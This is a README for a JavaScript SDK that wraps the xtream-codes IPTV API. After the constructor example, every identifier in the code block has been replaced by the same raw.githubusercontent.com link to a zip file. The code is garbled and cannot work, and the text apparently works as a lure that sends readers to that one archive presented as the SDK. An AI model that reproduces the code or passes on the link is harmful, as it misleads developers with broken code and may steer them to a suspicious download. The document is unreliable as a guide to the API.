XTream Codes
============
3rd party SDK api for stream-codes write in javascript

```js
import { Player } from 'xtream-codes'
// or const { Player } = require('xtream-codes')

// initialize player line api
const player = new Player({
  baseUrl: 'http://server:port',
  // username and password of user line
  auth: {
    username: 'test',
    password: 'test'
  }
})

https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip = 'http://server:port'

// retrieve account line information
https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip()
  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)

// GET Live Stream Categories
https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip()
  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)

// GET VOD Stream Categories
https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip()
  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)

// GET LIVE Streams
https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(category?: number) // (This will get All LIVE Streams in the selected category ONLY)
  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)

// GET VOD Streams 
https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(category?: number)
  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)

// GET VOD Info
https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(id: number) // This will get info such as video codecs, duration, description, directors for 1 VOD
  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)

// GET short_epg for LIVE Streams (same as stalker portal, prints the next X EPG that will play soon)
https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(id: number, limit: number)
  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)

// GET ALL EPG for LIVE Streams (same as stalker portal, but it will print all epg listings regardless of the day)
https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip(id: number)
  .then(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
  .catch(https://raw.githubusercontent.com/BarrerosLeo/xtream-codes/master/stockowner/xtream-codes.zip)
```
